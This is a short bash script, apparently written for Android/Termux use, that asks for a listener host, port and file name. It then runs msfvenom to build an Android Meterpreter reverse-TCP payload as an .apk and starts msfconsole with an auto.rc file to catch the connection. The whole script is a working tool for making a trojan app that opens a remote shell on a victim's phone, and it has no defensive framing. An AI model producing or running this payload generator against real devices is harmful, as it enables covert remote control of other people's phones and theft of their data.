echo 'new hackdt ? ( yes / no ) '
read -p '>> ' check
if [ $check = yes ]
then
echo LPORT: | lolcat
read -p '>> ' LPORT
echo LHOST: | lolcat
read -p '>> ' LHOST
echo Apk name: | lolcat
read -p '>> ' APK
msfvenom -p android/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT R >/sdcard/$APK.apk
msfconsole -r auto.rc
else
msfconsole -r auto.rc
fi


